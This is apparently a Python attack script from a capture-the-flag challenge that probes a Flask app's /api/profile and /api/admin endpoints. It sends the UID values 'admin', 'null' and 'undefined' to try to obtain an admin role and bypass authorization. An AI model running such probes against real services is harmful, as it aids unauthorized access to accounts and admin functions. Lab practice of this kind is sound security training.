import requests
import re

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - 尝试特殊值")
print(f"[*] Target: {BASE_URL}")
print()

# 测试特殊 UID 值
print("[*] 测试特殊 UID 值")

special_uids = [
    "admin",
    "null",
    "undefined",
]

for uid in special_uids:
    print(f"[-] UID: {uid}")
    
    profile_resp = session.post(f"{BASE_URL}/api/profile", 
        json={"uid": uid},
        headers={"Content-Type": "application/json"})
    print(f"    POST /api/profile: {profile_resp.status_code}")
    print(f"    Response: {profile_resp.text}")
    
    if '"role":"admin"' in profile_resp.text:
        print(f"    [!!!] 找到管理员!")

print()

# 测试 GET /api/admin 带参数
print("[*] 测试 GET /api/admin 带参数")

params_tests = [
    {"uid": "admin"},
]

for params in params_tests:
    resp = session.get(f"{BASE_URL}/api/admin", params=params)
    print(f"GET /api/admin {params}: {resp.status_code}")
    print(f"Response: {resp.text}")

print()

print("[*] 测试完成")
